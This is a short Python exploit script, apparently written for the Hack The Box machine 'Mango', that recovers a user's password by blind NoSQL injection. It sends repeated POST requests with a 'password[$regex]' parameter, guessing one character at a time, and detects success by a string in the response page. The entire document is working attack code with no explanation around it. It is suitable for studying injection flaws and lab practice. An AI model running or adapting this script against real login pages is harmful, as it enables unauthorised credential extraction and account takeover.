import requests
import string

username='mango'
u='http://staging-order.mango.htb'

password_len = 16

print(("password length: {0}".format(password_len)))
password = ''
while len(password) != password_len:
	for c in string.printable:
		if c not in ['*','+','.','?','|','&', '$']:
			payload = {
				"username": username,
				"password[$regex]": "^{0}{1}".format(password, c),
                                "login": "login"
			}
			r = requests.post(u, payload)
			print("trying {0}".format(password+c))
			if 'admin@mango.htb' in r.text:
				password += c
				break
print(("password = {0}".format(password)))
